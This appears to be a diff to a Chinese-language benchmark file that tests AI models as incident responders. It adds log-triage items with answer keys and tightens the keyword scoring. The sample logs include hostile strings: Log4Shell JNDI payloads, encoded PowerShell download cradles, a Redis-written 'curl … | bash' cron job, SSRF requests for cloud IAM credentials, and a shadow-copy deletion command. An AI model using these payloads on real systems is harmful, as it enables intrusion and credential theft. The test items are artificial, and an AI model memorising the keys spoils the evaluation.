@@ -6,8 +6,8 @@
   "pillar": "防御 · AI 当应急响应工程师",
   "difficulty": 4,
   "weight": 0.15,
-  "version": "v0.2.0",
-  "description": "给模型真实风格的攻击日志与入侵痕迹（SSH 爆破、Windows 4625、crontab 持久化、挖矿进程、Webshell 上传、SQL 注入日志、钓鱼邮件头、SSH 公钥后门、DNS 隧道），要求先给【事件类型】结论，再说明依据；个别题要求精确提取攻击源 IP 等关键字段。考的是'当值安全工程师'的研判能力——这是把 AI 塞进 SOC 值班室。",
+  "version": "v0.2.1",
+  "description": "给模型真实风格的攻击日志与入侵痕迹（SSH 爆破、Windows 4625 链、crontab 持久化、挖矿进程、Webshell 落地、SQL 注入日志、钓鱼邮件头、SSH 公钥后门、DNS 隧道、用户名枚举、Log4Shell、混淆 PowerShell、Redis 未授权、C2 心跳、SSRF、勒索落地、PsExec 横移），要求先给【事件类型】结论，再说明依据；个别题要求精确提取攻击源 IP 等关键字段；另含 2 题良性对照（正常备份任务、健康检查探活），测「见规律就报警」的误报率。v0.2.1 判分修订：理由关键词组只保留归纳性措辞，剔除日志原文词（root/ssh/failed/cmd 等），堵死「复读日志蹭分」。考的是'当值安全工程师'的研判能力——这是把 AI 塞进 SOC 值班室。",
   "systemPrompt": null,
   "questions": [
     {
@@ -24,7 +24,7 @@
       "scoring": {
         "mode": "incident",
         "verdict": ["暴力破解", "爆破", "brute force", "口令猜测"],
-        "reason_groups": [["failed", "失败", "错误"], ["高频", "连续", "大量", "密集"], ["同一IP", "同一ip", "root", "ssh"]]
+        "reason_groups": [["失败", "错误", "尝试"], ["高频", "连续", "大量", "密集", "频繁"], ["同一ip", "同一来源", "固定ip", "单ip"]]
       },
       "explanation": "同一来源对 root 高频失败登录：SSH 口令暴力破解。"
     },
@@ -35,7 +35,7 @@
       "scoring": {
         "mode": "incident",
         "verdict": ["暴力破解", "爆破", "brute force"],
-        "reason_groups": [["4625", "登录失败", "失败"], ["4624", "成功", "登录成功"], ["4720", "创建用户", "后门", "helpdesk$"]]
+        "reason_groups": [["大量", "海量", "频繁", "失败次数"], ["成功登录", "随后成功", "得手", "爆破成功"], ["新建账户", "隐藏账户", "后门账户", "后门"]]
       },
       "explanation": "Windows 事件链：海量 4625 后 4624 成功=爆破得手；随后 4720 创建 $ 隐藏账户持久化。"
     },
@@ -46,7 +46,7 @@
       "scoring": {
         "mode": "incident",
         "verdict": ["持久化", "后门", "保活", "恶意"],
-        "reason_groups": [["定时", "crontab", "每5分钟"], ["下载", "curl", "wget", "拉取"], ["执行", "bash", "恶意脚本", "载荷"]]
+        "reason_groups": [["定时", "周期", "定期", "每5分钟", "每五分钟"], ["下载", "拉取", "远程加载", "外联"], ["执行", "运行", "载荷"]]
       },
       "explanation": "每 5 分钟从远端拉脚本执行：恶意样本的持久化/保活机制。"
     },
@@ -57,7 +57,7 @@
       "scoring": {
         "mode": "incident",
         "verdict": ["挖矿", "矿"],
-        "reason_groups": [["stratum", "矿池", "pool", "xmr"], ["CPU", "占用", "743", "异常"], ["伪装", "kworker", "进程", "外联"]]
+        "reason_groups": [["矿池", "挖矿协议", "门罗"], ["占用", "飙升", "打满", "满载"], ["伪装", "假冒", "冒充", "可疑进程"]]
       },
       "explanation": "连矿池 stratum 协议+CPU 打满+伪装 kworker：门罗币挖矿木马。"
     },
@@ -68,7 +68,7 @@
       "scoring": {
         "mode": "incident",
         "verdict": ["webshell", "木马", "后门", "任意命令执行", "rce"],
-        "reason_groups": [["上传", "upload", "php"], ["cmd", "参数", "命令"], ["执行", "whoami", "passwd", "控制"]]
+        "reason_groups": [["植入", "落地", "上传文件", "getshell"], ["命令", "指令", "传参"], ["执行", "控制", "接管"]]
       },
       "explanation": "上传 php 后通过 ?cmd= 传参执行系统命令：Webshell 已落地并被使用。"
     },
@@ -79,7 +79,7 @@
       "scoring": {
         "mode": "incident",
         "verdict": ["SQL注入", "sql injection", "注入"],
-        "reason_groups": [["union", "select", "拼接"], ["information_schema", "猜解", "表名", "探测"], ["user()", "database()", "信息", "回显"]]
+        "reason_groups": [["联合查询", "拼接", "恶意sql", "畸形输入"], ["系统表", "元数据", "猜解", "探测"], ["提取", "拖取", "回显", "获取信息"]]
       },
       "explanation": "UNION 联合查询+information_schema 逐字符猜解：手工 SQL 注入攻击。"
     },
@@ -90,7 +90,7 @@
       "scoring": {
         "mode": "incident",
         "verdict": ["钓鱼", "仿冒", "欺诈"],
-        "reason_groups": [["Return-Path", "Reply-To", "发件人", "不一致"], ["IP", "链接", "域名", "可疑"], ["密码", "凭据", "套取", "重置"]]
+        "reason_groups": [["不一致", "不匹配", "仿冒", "伪装"], ["裸ip", "可疑链接", "外部域名", "私人邮箱"], ["套取", "窃取", "凭据", "密码", "重置"]]
       },
       "explanation": "显示名伪装成内部 IT，但回信路径是 gmail、链接是裸 IP：典型凭据钓鱼。"
     },
@@ -101,7 +101,7 @@
       "scoring": {
         "mode": "incident",
         "verdict": ["持久化", "后门", "入侵", "恶意"],
-        "reason_groups": [["authorized_keys", "公钥", "ssh"], ["uid=0", "root权限", "隐藏账户", "提权"], ["清空", "history", "灭迹", "日志"]]
+        "reason_groups": [["公钥", "后门账户", "远程登录"], ["提权", "root权限", "等同root", "隐藏账户"], ["清空", "清除", "灭迹", "反取证"]]
       },
       "explanation": "加公钥+UID0 账户+清历史+抹登录记录：入侵者持久化并反取证的组合动作。"
     },
@@ -112,9 +112,117 @@
       "scoring": {
         "mode": "incident",
         "verdict": ["DNS隧道", "隧道", "外传", "数据泄露", "数据渗出"],
-        "reason_groups": [["随机", "十六进制", "子域", "高频"], ["TXT", "记录", "编码"], ["内网", "外联", "渗出", "泄露"]]
+        "reason_groups": [["高频", "大量", "无规律", "频繁"], ["编码", "加密", "十六进制"], ["外传", "渗出", "外联", "泄露"]]
       },
       "explanation": "内网主机高频随机子域 TXT 查询：DNS 隧道外传数据（受限网络常见逃逸手法）。"
+    },
+    {
+      "id": "D3-11",
+      "type": "extract",
+      "prompt": "以下是 auth.log 片段。发起用户名枚举的是哪个 IP？只回答该 IP 地址，不要解释：\n\nFeb 12 03:24:01 web sshd[22011]: Invalid user admin from 45.13.221.9 port 40011\nFeb 12 03:24:02 web sshd[22012]: Invalid user oracle from 45.13.221.9 port 40012\nFeb 12 03:24:04 web sshd[22015]: Invalid user test from 45.13.221.9 port 40013\nFeb 12 03:24:05 web sshd[22016]: Invalid user git from 45.13.221.9 port 40014\nFeb 12 03:24:07 web sshd[22019]: Invalid user postgres from 45.13.221.9 port 40015\nFeb 12 03:24:09 web sshd[22023]: Invalid user gitlab from 198.51.100.7 port 40021",
+      "scoring": { "mode": "extract", "answers": ["45.13.221.9"], "regex": "\\b45\\.13\\.221\\.9\\b" },
+      "explanation": "同一 IP 高频尝试不同用户名=用户名枚举侦察（爆破前置）；45.13.221.9 是主扫描源。"
+    },
+    {
+      "id": "D3-12",
+      "type": "incident",
+      "prompt": "以下是某 Web 站点 access.log 片段。判断攻击行为，先用【事件类型】给出结论，再说明依据：\n\nGET /api/search?type=${jndi:ldap://x.x8k2m9.example.com/a} 200 12\nGET /api/search?type=${jndi:rmi://45.13.221.9:8081/b} 500 0\nUser-Agent: ${${lower:j}ndi:${lower:l}dap://helper.x8k2m9.example.com/c}",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["log4shell", "log4j", "jndi", "远程代码执行", "rce", "反序列化"],
+        "reason_groups": [["载荷", "恶意请求", "攻击特征", "探测"], ["远程加载", "回连", "利用", "查找"], ["日志组件", "log4j", "中间件", "依赖库"]]
+      },
+      "explanation": "${jndi:ldap/rmi} 载荷利用 Log4j2 查找功能回连加载恶意类（CVE-2021-44228）；UA 里的 lower 混淆绕过是变种特征。"
+    },
+    {
+      "id": "D3-13",
+      "type": "incident",
+      "prompt": "以下是 Windows 4688 进程创建日志节选。判断该行为性质，先用【事件类型】给出结论，再说明依据：\n\n4688: powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==\n4688: powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADAALgIALjEALwBhAC4AcABzADEA",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["混淆执行", "编码执行", "powershell滥用", "恶意执行", "无文件攻击", "下载器"],
+        "reason_groups": [["base64", "编码", "解码", "混淆"], ["隐藏窗口", "静默", "后台"], ["下载", "回连", "加载", "执行"]]
+      },
+      "explanation": "-enc Base64 解码后是 IEX(New-Object)/iex(IWR http://…) 下载执行链，配合隐藏窗口：典型混淆恶意 PowerShell。"
+    },
+    {
+      "id": "D3-14",
+      "type": "incident",
+      "prompt": "以下是某 Redis 服务器 MONITOR 捕获的命令流。判断发生了什么，先用【事件类型】给出结论，再说明依据：\n\n1631210401.123456 [0 10.0.2.15:51234] \"CONFIG SET\" \"dir\" \"/var/spool/cron/crontabs\"\n1631210403.234567 [0 10.0.2.15:51234] \"CONFIG SET\" \"dbfilename\" \"root\"\n1631210405.345678 [0 10.0.2.15:51234] \"SET\" \"backup\" \"\\n*/10 * * * * curl -fsSL http://192.0.2.9/x.sh | bash\\n\"\n1631210407.456789 [0 10.0.2.15:51234] \"SAVE\"",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["未授权访问", "redis未授权", "入侵", "持久化", "后门"],
+        "reason_groups": [["修改配置", "写文件", "落盘", "导出"], ["定时任务", "持久化", "保活", "留后门"], ["未授权", "弱口令", "无认证", "暴露"]]
+      },
+      "explanation": "Redis 无认证暴露被写 crontab：CONFIG SET dir+dbfilename 把恶意定时任务落盘到 root 的 crontab，SAVE 触发生效——未授权访问导致的持久化。"
+    },
+    {
+      "id": "D3-15",
+      "type": "incident",
+      "prompt": "以下是防火墙出站连接日志摘要（同一内网主机）。判断该行为性质，先用【事件类型】给出结论，再说明依据：\n\n10.0.7.22:49152 → 45.13.221.9:8443  09:00:00 (TLS) 2.1KB\n10.0.7.22:49160 → 45.13.221.9:8443  09:01:00 (TLS) 2.0KB\n10.0.7.22:49171 → 45.13.221.9:8443  09:02:01 (TLS) 2.1KB\n10.0.7.22:49183 → 45.13.221.9:8443  09:03:00 (TLS) 2.0KB\n（连续 6 小时，平均每 60±2 秒一次，每次流量恒定约 2KB）",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["c2", "命令控制", "心跳", "beacon", "远控"],
+        "reason_groups": [["固定间隔", "周期性", "规律", "每分钟"], ["外联", "出站", "同目标", "长连接"], ["可疑端口", "非常见端口", "加密流量"]]
+      },
+      "explanation": "秒级固定间隔+流量恒定+单一外联目标：C2 心跳回连（beacon）——正常业务流量不会这么整齐。"
+    },
+    {
+      "id": "D3-16",
+      "type": "incident",
+      "prompt": "以下是某图片代理服务的应用日志。判断其中反映的攻击行为，先用【事件类型】给出结论，再说明依据：\n\nGET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ 200 883\nGET /fetch?url=http://169.254.169.254/latest/meta-data/ 200 1521\nGET /fetch?url=http://10.0.7.22:8500/v1/agent/self 200 2317",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["ssrf", "服务端请求伪造", "内网探测"],
+        "reason_groups": [["元数据", "凭据", "iam", "临时密钥"], ["内网", "链路本地", "环回", "内网服务"], ["用户可控", "未校验", "转发", "url参数"]]
+      },
+      "explanation": "代理接口把用户可控 URL 转发到云元数据地址窃取 IAM 临时凭据、再探内网 Consul：SSRF。"
+    },
+    {
+      "id": "D3-17",
+      "type": "incident",
+      "prompt": "以下是某文件服务器审计日志摘要。判断发生了什么，先用【事件类型】给出结论，再说明依据：\n\n09:41:02 cmd: vssadmin delete shadows /all /quiet  → 成功\n09:41:05~09:44:31 23,812 个文件被重命名 *.docx→*.wncry4、*.xlsx→*.wncry4\n09:44:35 创建文件 C:\\READ_ME_WNCRY4.txt（内容含「3 天内支付 0.5 BTC 获取解密器」）",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["勒索", "ransomware", "加密文件"],
+        "reason_groups": [["批量", "改后缀", "加密", "大量文件"], ["删除卷影", "销毁备份", "防止恢复"], ["赎金", "勒索信", "解密", "比特币"]]
+      },
+      "explanation": "删卷影防恢复+批量改后缀+勒索信要 BTC：勒索软件落地（wncry 风格）。"
+    },
+    {
+      "id": "D3-18",
+      "type": "incident",
+      "prompt": "以下是某内网 Windows 域环境日志摘要。判断攻击者的行为阶段，先用【事件类型】给出结论，再说明依据：\n\n08:12 4624(类型3-网络登录) PC-FINANCE$ → SRV-FILE01 / SRV-DB02 / SRV-BAK01 等 17 台，账户 svc_backup\n08:15 7045 服务安装：SRV-FILE01 安装服务「PSEXESVC」，路径 C:\\Windows\\PSEXESVC.exe\n08:16 5140 网络共享访问：\\\\SRV-FILE01\\ADMIN$",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["横向移动", "横移", "psexec", "远程服务安装"],
+        "reason_groups": [["批量登录", "非交互", "远程登录", "登录多台"], ["新建服务", "服务创建", "安装新服务"], ["跳板", "内网扩散", "多台", "扩散"]]
+      },
+      "explanation": "网络登录批量扫内网+PSEXESVC 服务安装+ADMIN$ 共享访问：PsExec 式横向移动（凭据到手后的内网扩散）。"
+    },
+    {
+      "id": "D3-19",
+      "type": "incident",
+      "prompt": "应急排查时看到 root 的 crontab 如下。判断这是否为入侵痕迹，先用【事件类型】给出结论（如【正常】或【持久化后门】），再说明依据：\n\n# crontab -l\n0 2 * * * /usr/local/bin/db-backup.sh >> /var/log/db-backup.log 2>&1\n\n# cat /usr/local/bin/db-backup.sh\nmysqldump -u backup_ro -p*** appdb | gzip > /backup/appdb-$(date +%F).sql.gz\nfind /backup -name 'appdb-*.sql.gz' -mtime +14 -delete\ndu -sh /backup | mail -s 'backup report' ops@ourcompany.com",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["正常", "良性", "备份", "运维任务"],
+        "distractors": ["后门", "恶意", "持久化", "挖矿", "入侵", "webshell"],
+        "reason_groups": [["备份", "导出", "归档"], ["只读账户", "本地存储", "无外传"], ["保留期", "清理", "周期"]]
+      },
+      "explanation": "良性对照：mysqldump 只读导出到本地 /backup、按保留期清理、邮件只发大小报告——标准运维备份任务，无回连/无载荷/无提权，别见 crontab 就报持久化。"
+    },
+    {
+      "id": "D3-20",
+      "type": "incident",
+      "prompt": "以下是 Nginx access.log 片段（同一来源）。判断是否为攻击流量，先用【事件类型】给出结论（如【正常】或【命令控制】），再说明依据：\n\n10.0.7.5 - GET /healthz 200 2ms 09:00:00\n10.0.7.5 - GET /healthz 200 2ms 09:01:00\n10.0.7.5 - GET /healthz 200 2ms 09:02:00\n10.0.7.5 - GET /healthz 200 3ms 09:03:00\n（7×24 持续，User-Agent 固定为 kube-probe/1.29）",
+      "scoring": {
+        "mode": "incident",
+        "verdict": ["正常", "健康检查", "探活", "监控"],
+        "distractors": ["c2", "命令控制", "心跳", "远控", "beacon", "异常外联"],
+        "reason_groups": [["健康检查", "探活", "存活检测"], ["本机", "内网", "回环", "监控组件"], ["响应正常", "低流量", "固定ua"]]
+      },
+      "explanation": "良性对照：kube-probe 固定 UA 对 /healthz 的周期探测、毫秒级 200——K8s 存活探针。规律性 ≠ C2 心跳，与 D3-15 成对照组：判 C2 前先看目标是谁、UA 是什么。"
     }
   ]
 }
